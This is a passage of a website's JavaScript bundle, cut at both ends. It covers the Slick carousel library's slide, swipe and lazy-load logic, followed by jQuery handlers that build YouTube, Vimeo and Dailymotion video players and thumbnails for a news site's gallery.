      }
    }) : 39 === e.keyCode && !0 === this.options.accessibility && this.changeSlide({
      data: {
        message: !0 === this.options.rtl ? "previous" : "next"
      }
    }));
  }, r.prototype.lazyLoad = function () {
    function e(e) {
      d("img[data-lazy]", e).each(function () {
        var e = d(this),
          t = d(this).attr("data-lazy"),
          n = d(this).attr("data-srcset"),
          i = d(this).attr("data-sizes") || r.$slider.attr("data-sizes"),
          o = document.createElement("img");
        o.onload = function () {
          e.animate({
            opacity: 0
          }, 100, function () {
            n && (e.attr("srcset", n), i && e.attr("sizes", i)), e.attr("src", t).animate({
              opacity: 1
            }, 200, function () {
              e.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading");
            }), r.$slider.trigger("lazyLoaded", [r, e, t]);
          });
        }, o.onerror = function () {
          e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), r.$slider.trigger("lazyLoadError", [r, e, t]);
        }, o.src = t;
      });
    }
    var t,
      n,
      i,
      r = this;
    if (!0 === r.options.centerMode ? i = !0 === r.options.infinite ? (n = r.currentSlide + (r.options.slidesToShow / 2 + 1)) + r.options.slidesToShow + 2 : (n = Math.max(0, r.currentSlide - (r.options.slidesToShow / 2 + 1)), r.options.slidesToShow / 2 + 1 + 2 + r.currentSlide) : (n = r.options.infinite ? r.options.slidesToShow + r.currentSlide : r.currentSlide, i = Math.ceil(n + r.options.slidesToShow), !0 === r.options.fade && (0 < n && n--, i <= r.slideCount && i++)), t = r.$slider.find(".slick-slide").slice(n, i), "anticipated" === r.options.lazyLoad) for (var o = n - 1, a = i, s = r.$slider.find(".slick-slide"), l = 0; l < r.options.slidesToScroll; l++) o < 0 && (o = r.slideCount - 1), t = (t = t.add(s.eq(o))).add(s.eq(a)), o--, a++;
    e(t), r.slideCount <= r.options.slidesToShow ? e(r.$slider.find(".slick-slide")) : r.currentSlide >= r.slideCount - r.options.slidesToShow ? e(r.$slider.find(".slick-cloned").slice(0, r.options.slidesToShow)) : 0 === r.currentSlide && e(r.$slider.find(".slick-cloned").slice(-1 * r.options.slidesToShow));
  }, r.prototype.loadSlider = function () {
    this.setPosition(), this.$slideTrack.css({
      opacity: 1
    }), this.$slider.removeClass("slick-loading"), this.initUI(), "progressive" === this.options.lazyLoad && this.progressiveLazyLoad();
  }, r.prototype.next = r.prototype.slickNext = function () {
    this.changeSlide({
      data: {
        message: "next"
      }
    });
  }, r.prototype.orientationChange = function () {
    this.checkResponsive(), this.setPosition();
  }, r.prototype.pause = r.prototype.slickPause = function () {
    this.autoPlayClear(), this.paused = !0;
  }, r.prototype.play = r.prototype.slickPlay = function () {
    this.autoPlay(), this.options.autoplay = !0, this.paused = !1, this.focussed = !1, this.interrupted = !1;
  }, r.prototype.postSlide = function (e) {
    var t = this;
    t.unslicked || (t.$slider.trigger("afterChange", [t, e]), t.animating = !1, t.slideCount > t.options.slidesToShow && t.setPosition(), t.swipeLeft = null, t.options.autoplay && t.autoPlay(), !0 === t.options.accessibility && (t.initADA(), t.options.focusOnChange && d(t.$slides.get(t.currentSlide)).attr("tabindex", 0).focus()));
  }, r.prototype.prev = r.prototype.slickPrev = function () {
    this.changeSlide({
      data: {
        message: "previous"
      }
    });
  }, r.prototype.preventDefault = function (e) {
    e.preventDefault();
  }, r.prototype.progressiveLazyLoad = function (e) {
    e = e || 1;
    var t,
      n,
      i,
      o,
      r,
      a = this,
      s = d("img[data-lazy]", a.$slider);
    s.length ? (t = s.first(), n = t.attr("data-lazy"), i = t.attr("data-srcset"), o = t.attr("data-sizes") || a.$slider.attr("data-sizes"), (r = document.createElement("img")).onload = function () {
      i && (t.attr("srcset", i), o && t.attr("sizes", o)), t.attr("src", n).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"), !0 === a.options.adaptiveHeight && a.setPosition(), a.$slider.trigger("lazyLoaded", [a, t, n]), a.progressiveLazyLoad();
    }, r.onerror = function () {
      e < 3 ? setTimeout(function () {
        a.progressiveLazyLoad(e + 1);
      }, 500) : (t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), a.$slider.trigger("lazyLoadError", [a, t, n]), a.progressiveLazyLoad());
    }, r.src = n) : a.$slider.trigger("allImagesLoaded", [a]);
  }, r.prototype.refresh = function (e) {
    var t,
      n,
      i = this;
    n = i.slideCount - i.options.slidesToShow, !i.options.infinite && i.currentSlide > n && (i.currentSlide = n), i.slideCount <= i.options.slidesToShow && (i.currentSlide = 0), t = i.currentSlide, i.destroy(!0), d.extend(i, i.initials, {
      currentSlide: t
    }), i.init(), e || i.changeSlide({
      data: {
        message: "index",
        index: t
      }
    }, !1);
  }, r.prototype.registerBreakpoints = function () {
    var e,
      t,
      n,
      i = this,
      o = i.options.responsive || null;
    if ("array" === d.type(o) && o.length) {
      for (e in i.respondTo = i.options.respondTo || "window", o) if (n = i.breakpoints.length - 1, o.hasOwnProperty(e)) {
        for (t = o[e].breakpoint; 0 <= n;) i.breakpoints[n] && i.breakpoints[n] === t && i.breakpoints.splice(n, 1), n--;
        i.breakpoints.push(t), i.breakpointSettings[t] = o[e].settings;
      }
      i.breakpoints.sort(function (e, t) {
        return i.options.mobileFirst ? e - t : t - e;
      });
    }
  }, r.prototype.reinit = function () {
    var e = this;
    e.$slides = e.$slideTrack.children(e.options.slide).addClass("slick-slide"), e.slideCount = e.$slides.length, e.currentSlide >= e.slideCount && 0 !== e.currentSlide && (e.currentSlide = e.currentSlide - e.options.slidesToScroll), e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0), e.registerBreakpoints(), e.setProps(), e.setupInfinite(), e.buildArrows(), e.updateArrows(), e.initArrowEvents(), e.buildDots(), e.updateDots(), e.initDotEvents(), e.cleanUpSlideEvents(), e.initSlideEvents(), e.checkResponsive(!1, !0), !0 === e.options.focusOnSelect && d(e.$slideTrack).children().on("click.slick", e.selectHandler), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), e.setPosition(), e.focusHandler(), e.paused = !e.options.autoplay, e.autoPlay(), e.$slider.trigger("reInit", [e]);
  }, r.prototype.resize = function () {
    var e = this;
    d(window).width() !== e.windowWidth && (clearTimeout(e.windowDelay), e.windowDelay = window.setTimeout(function () {
      e.windowWidth = d(window).width(), e.checkResponsive(), e.unslicked || e.setPosition();
    }, 50));
  }, r.prototype.removeSlide = r.prototype.slickRemove = function (e, t, n) {
    var i = this;
    if (e = "boolean" == typeof e ? !0 === (t = e) ? 0 : i.slideCount - 1 : !0 === t ? --e : e, i.slideCount < 1 || e < 0 || e > i.slideCount - 1) return !1;
    i.unload(), !0 === n ? i.$slideTrack.children().remove() : i.$slideTrack.children(this.options.slide).eq(e).remove(), i.$slides = i.$slideTrack.children(this.options.slide), i.$slideTrack.children(this.options.slide).detach(), i.$slideTrack.append(i.$slides), i.$slidesCache = i.$slides, i.reinit();
  }, r.prototype.setCSS = function (e) {
    var t,
      n,
      i = this,
      o = {};
    !0 === i.options.rtl && (e = -e), t = "left" == i.positionProp ? Math.ceil(e) + "px" : "0px", n = "top" == i.positionProp ? Math.ceil(e) + "px" : "0px", o[i.positionProp] = e, !1 === i.transformsEnabled || (!(o = {}) === i.cssTransitions ? o[i.animType] = "translate(" + t + ", " + n + ")" : o[i.animType] = "translate3d(" + t + ", " + n + ", 0px)"), i.$slideTrack.css(o);
  }, r.prototype.setDimensions = function () {
    var e = this;
    !1 === e.options.vertical ? !0 === e.options.centerMode && e.$list.css({
      padding: "0px " + e.options.centerPadding
    }) : (e.$list.height(e.$slides.first().outerHeight(!0) * e.options.slidesToShow), !0 === e.options.centerMode && e.$list.css({
      padding: e.options.centerPadding + " 0px"
    })), e.listWidth = e.$list.width(), e.listHeight = e.$list.height(), !1 === e.options.vertical && !1 === e.options.variableWidth ? (e.slideWidth = Math.ceil(e.listWidth / e.options.slidesToShow), e.$slideTrack.width(Math.ceil(e.slideWidth * e.$slideTrack.children(".slick-slide").length))) : !0 === e.options.variableWidth ? e.$slideTrack.width(5e3 * e.slideCount) : (e.slideWidth = Math.ceil(e.listWidth), e.$slideTrack.height(Math.ceil(e.$slides.first().outerHeight(!0) * e.$slideTrack.children(".slick-slide").length)));
    var t = e.$slides.first().outerWidth(!0) - e.$slides.first().width();
    !1 === e.options.variableWidth && e.$slideTrack.children(".slick-slide").width(e.slideWidth - t);
  }, r.prototype.setFade = function () {
    var n,
      i = this;
    i.$slides.each(function (e, t) {
      n = i.slideWidth * e * -1, !0 === i.options.rtl ? d(t).css({
        position: "relative",
        right: n,
        top: 0,
        zIndex: i.options.zIndex - 2,
        opacity: 0
      }) : d(t).css({
        position: "relative",
        left: n,
        top: 0,
        zIndex: i.options.zIndex - 2,
        opacity: 0
      });
    }), i.$slides.eq(i.currentSlide).css({
      zIndex: i.options.zIndex - 1,
      opacity: 1
    });
  }, r.prototype.setHeight = function () {
    if (1 === this.options.slidesToShow && !0 === this.options.adaptiveHeight && !1 === this.options.vertical) {
      var e = this.$slides.eq(this.currentSlide).outerHeight(!0);
      this.$list.css("height", e);
    }
  }, r.prototype.setOption = r.prototype.slickSetOption = function () {
    var e,
      t,
      n,
      i,
      o,
      r = this,
      a = !1;
    if ("object" === d.type(arguments[0]) ? (n = arguments[0], a = arguments[1], o = "multiple") : "string" === d.type(arguments[0]) && (i = arguments[1], a = arguments[2], "responsive" === (n = arguments[0]) && "array" === d.type(arguments[1]) ? o = "responsive" : void 0 !== arguments[1] && (o = "single")), "single" === o) r.options[n] = i;else if ("multiple" === o) d.each(n, function (e, t) {
      r.options[e] = t;
    });else if ("responsive" === o) for (t in i) if ("array" !== d.type(r.options.responsive)) r.options.responsive = [i[t]];else {
      for (e = r.options.responsive.length - 1; 0 <= e;) r.options.responsive[e].breakpoint === i[t].breakpoint && r.options.responsive.splice(e, 1), e--;
      r.options.responsive.push(i[t]);
    }
    a && (r.unload(), r.reinit());
  }, r.prototype.setPosition = function () {
    this.setDimensions(), this.setHeight(), !1 === this.options.fade ? this.setCSS(this.getLeft(this.currentSlide)) : this.setFade(), this.$slider.trigger("setPosition", [this]);
  }, r.prototype.setProps = function () {
    var e = this,
      t = document.body.style;
    e.positionProp = !0 === e.options.vertical ? "top" : "left", "top" === e.positionProp ? e.$slider.addClass("slick-vertical") : e.$slider.removeClass("slick-vertical"), void 0 === t.WebkitTransition && void 0 === t.MozTransition && void 0 === t.msTransition || !0 === e.options.useCSS && (e.cssTransitions = !0), e.options.fade && ("number" == typeof e.options.zIndex ? e.options.zIndex < 3 && (e.options.zIndex = 3) : e.options.zIndex = e.defaults.zIndex), void 0 !== t.OTransform && (e.animType = "OTransform", e.transformType = "-o-transform", e.transitionType = "OTransition", void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)), void 0 !== t.MozTransform && (e.animType = "MozTransform", e.transformType = "-moz-transform", e.transitionType = "MozTransition", void 0 === t.perspectiveProperty && void 0 === t.MozPerspective && (e.animType = !1)), void 0 !== t.webkitTransform && (e.animType = "webkitTransform", e.transformType = "-webkit-transform", e.transitionType = "webkitTransition", void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)), void 0 !== t.msTransform && (e.animType = "msTransform", e.transformType = "-ms-transform", e.transitionType = "msTransition", void 0 === t.msTransform && (e.animType = !1)), void 0 !== t.transform && !1 !== e.animType && (e.animType = "transform", e.transformType = "transform", e.transitionType = "transition"), e.transformsEnabled = e.options.useTransform && null !== e.animType && !1 !== e.animType;
  }, r.prototype.setSlideClasses = function (e) {
    var t,
      n,
      i,
      o,
      r = this;
    if (n = r.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"), r.$slides.eq(e).addClass("slick-current"), !0 === r.options.centerMode) {
      var a = r.options.slidesToShow % 2 == 0 ? 1 : 0;
      t = Math.floor(r.options.slidesToShow / 2), !0 === r.options.infinite && (t <= e && e <= r.slideCount - 1 - t ? r.$slides.slice(e - t + a, e + t + 1).addClass("slick-active").attr("aria-hidden", "false") : (i = r.options.slidesToShow + e, n.slice(i - t + 1 + a, i + t + 2).addClass("slick-active").attr("aria-hidden", "false")), 0 === e ? n.eq(n.length - 1 - r.options.slidesToShow).addClass("slick-center") : e === r.slideCount - 1 && n.eq(r.options.slidesToShow).addClass("slick-center")), r.$slides.eq(e).addClass("slick-center");
    } else 0 <= e && e <= r.slideCount - r.options.slidesToShow ? r.$slides.slice(e, e + r.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : n.length <= r.options.slidesToShow ? n.addClass("slick-active").attr("aria-hidden", "false") : (o = r.slideCount % r.options.slidesToShow, i = !0 === r.options.infinite ? r.options.slidesToShow + e : e, r.options.slidesToShow == r.options.slidesToScroll && r.slideCount - e < r.options.slidesToShow ? n.slice(i - (r.options.slidesToShow - o), i + o).addClass("slick-active").attr("aria-hidden", "false") : n.slice(i, i + r.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false"));
    "ondemand" !== r.options.lazyLoad && "anticipated" !== r.options.lazyLoad || r.lazyLoad();
  }, r.prototype.setupInfinite = function () {
    var e,
      t,
      n,
      i = this;
    if (!0 === i.options.fade && (i.options.centerMode = !1), !0 === i.options.infinite && !1 === i.options.fade && (t = null, i.slideCount > i.options.slidesToShow)) {
      for (n = !0 === i.options.centerMode ? i.options.slidesToShow + 1 : i.options.slidesToShow, e = i.slideCount; e > i.slideCount - n; --e) t = e - 1, d(i.$slides[t]).clone(!0).attr("id", "").attr("data-slick-index", t - i.slideCount).prependTo(i.$slideTrack).addClass("slick-cloned");
      for (e = 0; e < n + i.slideCount; e += 1) t = e, d(i.$slides[t]).clone(!0).attr("id", "").attr("data-slick-index", t + i.slideCount).appendTo(i.$slideTrack).addClass("slick-cloned");
      i.$slideTrack.find(".slick-cloned").find("[id]").each(function () {
        d(this).attr("id", "");
      });
    }
  }, r.prototype.interrupt = function (e) {
    e || this.autoPlay(), this.interrupted = e;
  }, r.prototype.selectHandler = function (e) {
    var t = d(e.target).is(".slick-slide") ? d(e.target) : d(e.target).parents(".slick-slide"),
      n = parseInt(t.attr("data-slick-index"));
    n = n || 0, this.slideCount <= this.options.slidesToShow ? this.slideHandler(n, !1, !0) : this.slideHandler(n);
  }, r.prototype.slideHandler = function (e, t, n) {
    var i,
      o,
      r,
      a,
      s,
      l = null,
      d = this;
    if (t = t || !1, !(!0 === d.animating && !0 === d.options.waitForAnimate || !0 === d.options.fade && d.currentSlide === e)) if (!1 === t && d.asNavFor(e), i = e, l = d.getLeft(i), a = d.getLeft(d.currentSlide), d.currentLeft = null === d.swipeLeft ? a : d.swipeLeft, !1 === d.options.infinite && !1 === d.options.centerMode && (e < 0 || e > d.getDotCount() * d.options.slidesToScroll)) !1 === d.options.fade && (i = d.currentSlide, !0 !== n ? d.animateSlide(a, function () {
      d.postSlide(i);
    }) : d.postSlide(i));else if (!1 === d.options.infinite && !0 === d.options.centerMode && (e < 0 || e > d.slideCount - d.options.slidesToScroll)) !1 === d.options.fade && (i = d.currentSlide, !0 !== n ? d.animateSlide(a, function () {
      d.postSlide(i);
    }) : d.postSlide(i));else {
      if (d.options.autoplay && clearInterval(d.autoPlayTimer), o = i < 0 ? d.slideCount % d.options.slidesToScroll != 0 ? d.slideCount - d.slideCount % d.options.slidesToScroll : d.slideCount + i : i >= d.slideCount ? d.slideCount % d.options.slidesToScroll != 0 ? 0 : i - d.slideCount : i, d.animating = !0, d.$slider.trigger("beforeChange", [d, d.currentSlide, o]), r = d.currentSlide, d.currentSlide = o, d.setSlideClasses(d.currentSlide), d.options.asNavFor && (s = (s = d.getNavTarget()).slick("getSlick")).slideCount <= s.options.slidesToShow && s.setSlideClasses(d.currentSlide), d.updateDots(), d.updateArrows(), !0 === d.options.fade) return !0 !== n ? (d.fadeSlideOut(r), d.fadeSlide(o, function () {
        d.postSlide(o);
      })) : d.postSlide(o), void d.animateHeight();
      !0 !== n ? d.animateSlide(l, function () {
        d.postSlide(o);
      }) : d.postSlide(o);
    }
  }, r.prototype.startLoad = function () {
    var e = this;
    !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.hide(), e.$nextArrow.hide()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.hide(), e.$slider.addClass("slick-loading");
  }, r.prototype.swipeDirection = function () {
    var e, t, n, i;
    return e = this.touchObject.startX - this.touchObject.curX, t = this.touchObject.startY - this.touchObject.curY, n = Math.atan2(t, e), (i = Math.round(180 * n / Math.PI)) < 0 && (i = 360 - Math.abs(i)), i <= 45 && 0 <= i ? !1 === this.options.rtl ? "left" : "right" : i <= 360 && 315 <= i ? !1 === this.options.rtl ? "left" : "right" : 135 <= i && i <= 225 ? !1 === this.options.rtl ? "right" : "left" : !0 === this.options.verticalSwiping ? 35 <= i && i <= 135 ? "down" : "up" : "vertical";
  }, r.prototype.swipeEnd = function (e) {
    var t,
      n,
      i = this;
    if (i.dragging = !1, i.swiping = !1, i.scrolling) return i.scrolling = !1;
    if (i.interrupted = !1, i.shouldClick = !(10 < i.touchObject.swipeLength), void 0 === i.touchObject.curX) return !1;
    if (!0 === i.touchObject.edgeHit && i.$slider.trigger("edge", [i, i.swipeDirection()]), i.touchObject.swipeLength >= i.touchObject.minSwipe) {
      switch (n = i.swipeDirection()) {
        case "left":
        case "down":
          t = i.options.swipeToSlide ? i.checkNavigable(i.currentSlide + i.getSlideCount()) : i.currentSlide + i.getSlideCount(), i.currentDirection = 0;
          break;
        case "right":
        case "up":
          t = i.options.swipeToSlide ? i.checkNavigable(i.currentSlide - i.getSlideCount()) : i.currentSlide - i.getSlideCount(), i.currentDirection = 1;
      }
      "vertical" != n && (i.slideHandler(t), i.touchObject = {}, i.$slider.trigger("swipe", [i, n]));
    } else i.touchObject.startX !== i.touchObject.curX && (i.slideHandler(i.currentSlide), i.touchObject = {});
  }, r.prototype.swipeHandler = function (e) {
    var t = this;
    if (!(!1 === t.options.swipe || "ontouchend" in document && !1 === t.options.swipe || !1 === t.options.draggable && -1 !== e.type.indexOf("mouse"))) switch (t.touchObject.fingerCount = e.originalEvent && void 0 !== e.originalEvent.touches ? e.originalEvent.touches.length : 1, t.touchObject.minSwipe = t.listWidth / t.options.touchThreshold, !0 === t.options.verticalSwiping && (t.touchObject.minSwipe = t.listHeight / t.options.touchThreshold), e.data.action) {
      case "start":
        t.swipeStart(e);
        break;
      case "move":
        t.swipeMove(e);
        break;
      case "end":
        t.swipeEnd(e);
    }
  }, r.prototype.swipeMove = function (e) {
    var t,
      n,
      i,
      o,
      r,
      a,
      s = this;
    return r = void 0 !== e.originalEvent ? e.originalEvent.touches : null, !(!s.dragging || s.scrolling || r && 1 !== r.length) && (t = s.getLeft(s.currentSlide), s.touchObject.curX = void 0 !== r ? r[0].pageX : e.clientX, s.touchObject.curY = void 0 !== r ? r[0].pageY : e.clientY, s.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(s.touchObject.curX - s.touchObject.startX, 2))), a = Math.round(Math.sqrt(Math.pow(s.touchObject.curY - s.touchObject.startY, 2))), !s.options.verticalSwiping && !s.swiping && 4 < a ? !(s.scrolling = !0) : (!0 === s.options.verticalSwiping && (s.touchObject.swipeLength = a), n = s.swipeDirection(), void 0 !== e.originalEvent && 4 < s.touchObject.swipeLength && (s.swiping = !0, e.preventDefault()), o = (!1 === s.options.rtl ? 1 : -1) * (s.touchObject.curX > s.touchObject.startX ? 1 : -1), !0 === s.options.verticalSwiping && (o = s.touchObject.curY > s.touchObject.startY ? 1 : -1), i = s.touchObject.swipeLength, (s.touchObject.edgeHit = !1) === s.options.infinite && (0 === s.currentSlide && "right" === n || s.currentSlide >= s.getDotCount() && "left" === n) && (i = s.touchObject.swipeLength * s.options.edgeFriction, s.touchObject.edgeHit = !0), !1 === s.options.vertical ? s.swipeLeft = t + i * o : s.swipeLeft = t + i * (s.$list.height() / s.listWidth) * o, !0 === s.options.verticalSwiping && (s.swipeLeft = t + i * o), !0 !== s.options.fade && !1 !== s.options.touchMove && (!0 === s.animating ? (s.swipeLeft = null, !1) : void s.setCSS(s.swipeLeft))));
  }, r.prototype.swipeStart = function (e) {
    var t,
      n = this;
    if (n.interrupted = !0, 1 !== n.touchObject.fingerCount || n.slideCount <= n.options.slidesToShow) return !(n.touchObject = {});
    void 0 !== e.originalEvent && void 0 !== e.originalEvent.touches && (t = e.originalEvent.touches[0]), n.touchObject.startX = n.touchObject.curX = void 0 !== t ? t.pageX : e.clientX, n.touchObject.startY = n.touchObject.curY = void 0 !== t ? t.pageY : e.clientY, n.dragging = !0;
  }, r.prototype.unfilterSlides = r.prototype.slickUnfilter = function () {
    null !== this.$slidesCache && (this.unload(), this.$slideTrack.children(this.options.slide).detach(), this.$slidesCache.appendTo(this.$slideTrack), this.reinit());
  }, r.prototype.unload = function () {
    var e = this;
    d(".slick-cloned", e.$slider).remove(), e.$dots && e.$dots.remove(), e.$prevArrow && e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.remove(), e.$nextArrow && e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.remove(), e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "");
  }, r.prototype.unslick = function (e) {
    this.$slider.trigger("unslick", [this, e]), this.destroy();
  }, r.prototype.updateArrows = function () {
    var e = this;
    Math.floor(e.options.slidesToShow / 2), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && !e.options.infinite && (e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), 0 === e.currentSlide ? (e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : e.currentSlide >= e.slideCount - e.options.slidesToShow && !1 === e.options.centerMode ? (e.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : e.currentSlide >= e.slideCount - 1 && !0 === e.options.centerMode && (e.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")));
  }, r.prototype.updateDots = function () {
    null !== this.$dots && (this.$dots.find("li").removeClass("slick-active").end(), this.$dots.find("li").eq(Math.floor(this.currentSlide / this.options.slidesToScroll)).addClass("slick-active"));
  }, r.prototype.visibility = function () {
    this.options.autoplay && (document[this.hidden] ? this.interrupted = !0 : this.interrupted = !1);
  }, d.fn.slick = function () {
    var e,
      t,
      n = arguments[0],
      i = Array.prototype.slice.call(arguments, 1),
      o = this.length;
    for (e = 0; e < o; e++) if ("object" == typeof n || void 0 === n ? this[e].slick = new r(this[e], n) : t = this[e].slick[n].apply(this[e].slick, i), void 0 !== t) return t;
    return this;
  };
}), $(document).ready(function () {
  var e = $(".svThumb");
  $(".gallery-show").prepend('<div class="svPlayer"><div class="infoBox"></div></div>'), e.wrapInner('<div class="sv-text"></div>'), e.prepend('<span class="sv-overlay"></span>');
}), $(document).ready(function () {
  $(".ytVideo").each(function () {
    var e = $(this).attr("data-videoIMG"),
      t = $(this).attr("data-timeID"),
      n = $(this).attr("data-Section"),
      i = $(this).attr("data-share"),
      o = $(this).attr("data-facebbok"),
      r = $(this).attr("data-twitter"),
      a = $(this).attr("data-videoID"),
      s = $(this).find("a[href]").attr("href"),
      l = $(this).text(),
      d = $('<div class="meuVideo"> <iframe width="560" height="315" src="https://www.youtube.com/embed/' + a + '?showinfo=1&autoplay=1" frameborder="0" allowfullscreen></iframe> </div>'),
      c = $('<img src="https://www.elwatannews.com/thumbnail/watan/192/128/' + e + '" data-anchor="svBox"/>');
    $(this).prepend(c), $(this).click(function () {
      return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(d).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + s + '"><h3 class="svTitle">' + l + "</h3></a></div>"), $(".video-information").html('<h3 class="time-section-title">' + n + '</h3><div class="video-time">' + t + "</div>"), $(".video-social").html('<ul><li><a href="' + i + '"><i class="fas fa-share"></i></a></li> <li><a href="' + o + '"><i class="fab fa-facebook-f"></i></a></li> <li><a href="' + r + '"><i class="fab fa-twitter"></i></a></li></ul>'), !1;
    });
  }), $(".youtube-video").each(function () {
    var e = $(this).attr("data-videoIMG"),
      t = $(this).attr("data-Section"),
      n = $(this).attr("data-videoID"),
      i = $(this).find("a[href]").attr("href"),
      o = $(this).text(),
      r = $('<div class="meuVideo"> <iframe width="560" height="315" src="https://www.youtube.com/embed/' + n + '?showinfo=1&autoplay=1" frameborder="0" allowfullscreen></iframe> </div>'),
      a = $('<img src="https://www.elwatannews.com/thumbnail/watan/192/128/' + e + '" data-anchor="svBox"/>');
    $(this).prepend(a), $(this).click(function () {
      return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(r).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + i + '"><h3 class="svTitle">' + o + '</h3></a><h3 class="time-section-title">' + t + "</h3> </div>"), !1;
    });
  }), $(".youtube-content").each(function () {
    var e = $(this).attr("data-Section"),
      t = $(this).attr("data-videoID"),
      n = $(this).find("a[href]").attr("href"),
      i = $(this).text(),
      o = $('<div class="meuVideo"> <iframe width="560" height="315" src="https://www.youtube.com/embed/' + t + '?showinfo=1&autoplay=1" frameborder="0" allowfullscreen></iframe> </div>');
    $(this).click(function () {
      return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(o).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + n + '"><h3 class="svTitle">' + i + '</h3></a><h3 class="time-section-title">' + e + "</h3> </div>"), !1;
    });
  }), $(".vimeoVideo").each(function () {
    var e = $(this).attr("data-videoIMG"),
      t = $(this).attr("data-timeID"),
      n = $(this).attr("data-Section"),
      i = $(this).attr("data-share"),
      o = $(this).attr("data-facebbok"),
      r = $(this).attr("data-twitter"),
      a = $(this).attr("data-videoID"),
      s = $(this).find("a[href]").attr("href"),
      l = $(this).text(),
      d = $('<div class="meuVideo"> <iframe src="https://player.vimeo.com/video/' + a + '?title=1&byline=1&portrait=1&badge=1&autoplay=1" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> </div>');
    $ytThumb = $('<img src="/thumbnail/watan/192/90/' + e + '" data-anchor="svBox"/>'), $(this).prepend($ytThumb), $(this).click(function () {
      return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(d).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + s + '"><h3 class="svTitle">' + l + "</h3></a></div>"), $(".video-information").html('<h3 class="time-section-title">' + n + '</h3><div class="video-time">' + t + "</div>"), $(".video-social").html('<ul><li><a href="' + i + '"><i class="fas fa-share"></i></a></li> <li><a href="' + o + '"><i class="fab fa-facebook-f"></i></a></li> <li><a href="' + r + '"><i class="fab fa-twitter"></i></a></li></ul>'), !1;
    });
  }), $(".dailyMVideo").each(function () {
    var e = $(this).attr("data-videoIMG"),
      t = $(this).attr("data-timeID"),
      n = $(this).attr("data-Section"),
      i = $(this).attr("data-share"),
      o = $(this).attr("data-facebbok"),
      r = $(this).attr("data-twitter"),
      a = $(this).attr("data-videoID"),
      s = $(this).find("a[href]").attr("href"),
      l = $(this).text(),
      d = $('<div class="meuVideo"> <iframe frameborder="0" width="640" height="360" src="//www.dailymotion.com/embed/video/' + a + '?autoplay=1" allowfullscreen></iframe> </div>'),
      c = $('<img src="/thumbnail/watan/192/90/' + e + '" data-anchor="svBox"/>');
    $(this).prepend(c), $(this).click(function () {
      return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(d).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + s + '"><h3 class="svTitle">' + l + "</h3></a></div>"), $(".video-information").html('<h3 class="time-section-title">' + n + '</h3><div class="video-time">' + t + "</div>"), $(".video-social").html('<ul><li><a href="' + i + '"><i class="fas fa-share"></i></a></li> <li><a href="' + o + '"><i class="fab fa-facebook-f"></i></a></li> <li><a href="' + r + '"><i class="fab fa-twitter"></i></a></li></ul>'), !1;
    });
  });
}), $(".dailyVideo").each(function () {
  var e = $(this).attr("data-videoIMG"),
    t = $(this).attr("data-Section"),
    n = $(this).attr("data-videoID"),
    i = $(this).find("a[href]").attr("href"),
    o = $(this).text(),
    r = $('<div class="meuVideo"> <iframe frameborder="0" width="640" height="360" src="//www.dailymotion.com/embed/video/' + n + '?autoplay=1" allowfullscreen></iframe> </div>'),
    a = $('<img src="https://www.elwatannews.com/thumbnail/watan/192/128/' + e + '" data-anchor="svBox"/>');
  $(this).prepend(a), $(this).click(function () {
    return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(r).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + i + '"><h3 class="svTitle">' + o + '</h3></a><h3 class="time-section-title">' + t + "</h3> </div>"), !1;
  });
}), $(".daily-content").each(function () {
  var e = $(this).attr("data-Section"),
    t = $(this).attr("data-videoID"),
    n = $(this).find("a[href]").attr("href"),
    i = $(this).text(),
    o = $('<div class="meuVideo"> <iframe frameborder="0" width="640" height="360" src="//www.dailymotion.com/embed/video/' + t + '?autoplay=1" allowfullscreen></iframe> </div>');
  $(this).click(function () {
    return $(".meuVideo, .nowPlaying").remove(), $(".svPlayer").prepend(o).hide().slideDown("fast"), $(".infoBox").prepend('<div class="nowPlaying"><a href="' + n + '"><h3 class="svTitle">' + i + '</h3></a><h3 class="time-section-title">' + e + "</h3> </div>"), !1;
  });
}), $(document).ready(function () {
  $(".writers-slider").slick({
    slidesToShow: 6,
    slidesToScroll: 6,
    autoplay: !1,
    dots: !1,
    arrows: !0,
